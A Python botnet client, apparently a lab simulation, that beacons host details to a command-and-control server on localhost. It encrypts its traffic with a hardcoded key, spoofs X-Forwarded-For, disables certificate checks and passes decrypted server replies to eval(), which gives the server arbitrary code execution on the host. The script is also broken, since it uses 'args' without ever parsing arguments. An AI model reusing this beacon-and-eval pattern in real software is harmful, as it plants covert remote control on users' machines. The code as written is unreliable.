import requests
import time
import platform
import socket
import argparse
import random
from cryptography.fernet import Fernet

parser = argparse.ArgumentParser()
parser.add_argument("--id", help="Custom bot ID")
parser.add_argument("--ip", help="Simulated IP address")

BOT_ID = args.id if args.id else "BOT_" + socket.gethostname()
SIMULATED_IP = args.ip if args.ip else f"192.168.1.{random.randint(2, 254)}"
C2_SERVER = "https://127.0.0.1:5000"
SECRET_TOKEN = "b627f0872c494b06ea32be187cb147ae"
FERNET_KEY = b"OdsY01hqgwPY2MI5Q6W9LTC6EYMIBW4jD2pTXJZ6UsQ="
fernet = Fernet(FERNET_KEY)

def send_heartbeat():
    while True:
        try:
            data = {
                'token': SECRET_TOKEN,
                'bot_id': BOT_ID,
                'os': platform.system() + " " + platform.release(),
                'ip': SIMULATED_IP
            }
            encrypted_data = fernet.encrypt(str(data).encode()).decode()

            headers = {'X-Forwarded-For': SIMULATED_IP}
            response = requests.post(
                f"{C2_SERVER}/heartbeat",
                json={'data': encrypted_data},
                headers=headers,
                verify=False
            ).json()

            if 'data' in response:
                decrypted_response = fernet.decrypt(response['data'].encode()).decode()
                command = eval(decrypted_response).get('command')
                if command:
                    execute_command(command)

        except Exception as e:
            print(f"[BOT {BOT_ID}] Error: {e}")

        time.sleep(random.randint(5, 15))

def execute_command(command):
    print(f"[BOT {BOT_ID}] Executing: {command} (IP: {SIMULATED_IP})")

if __name__ == '__main__':
    print(f"[*] Bot {BOT_ID} started (IP: {SIMULATED_IP})")
    send_heartbeat()